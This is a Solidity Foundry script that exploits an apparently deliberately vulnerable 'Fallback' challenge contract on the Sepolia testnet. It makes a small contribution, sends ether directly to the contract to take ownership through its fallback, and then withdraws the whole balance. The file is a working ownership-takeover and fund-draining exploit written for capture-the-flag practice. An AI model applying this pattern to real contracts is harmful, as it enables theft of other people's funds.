// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {FallbackTest} from "../test/Fallback.t.sol";
import {FallbackContract} from "../src/Fallback.sol";

contract FallbackScript is Script {
    FallbackContract public fallbackContract;

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6592475);
        fallbackContract = FallbackContract(payable(address(0x91ed60C2c7c8308CDc14Eeb329c0e43B977F877d)));
    }

    function run() public {
        vm.startBroadcast();

        fallbackContract = FallbackContract(payable(address(0x91ed60C2c7c8308CDc14Eeb329c0e43B977F877d)));

        fallbackContract.contribute{value: 0.0001 ether}();

        console.log(fallbackContract.getContribution());

        payable(address(fallbackContract)).call{value: 0.0001 ether}("");

        fallbackContract.withdraw();

        console.log(address(fallbackContract).balance);

        console.log(fallbackContract.owner());

        vm.stopBroadcast();
    }
}
